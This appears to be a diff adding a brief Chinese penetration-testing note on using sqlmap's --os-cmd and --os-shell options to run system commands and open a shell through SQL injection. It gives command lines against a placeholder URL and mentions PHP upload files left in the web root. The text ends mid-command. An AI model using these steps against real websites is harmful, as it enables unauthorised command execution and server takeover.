@@ -1,0 +1,32 @@
+
+
+               	        SQLMAP渗透笔记之交互写shell及命令执行(即os参数的使用)
+
+
+                                           作者：拿破飞机
+
+---------------------------------------------------------------------------------------------
+
+1.执行系统命令(windows系统)： --os-cmd=ipconfig
+sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --os-cmd=ipconfig
+
+执行后根据提示选择网站语言
+然后回车，指定目标站点根目录，然后继续回车即可完整执行命令
+
+2.执行shell： --os-shell
+sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --os-shell
+
+
+执行后根据提示选择网站语言，然后回车，指定目标站点根目录后回车，输入命令即可执行，也可起到提权的作用。
+
+
+
+执行命令后会在网站根目录生成两个临时文件：tmpbxbxz.php   tmpuoiuz.php(此文件为上传页面)
+
+
+注意：需要有足够大的权限方可执行命令
+
+
+查看网站权限
+
+sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --privileg
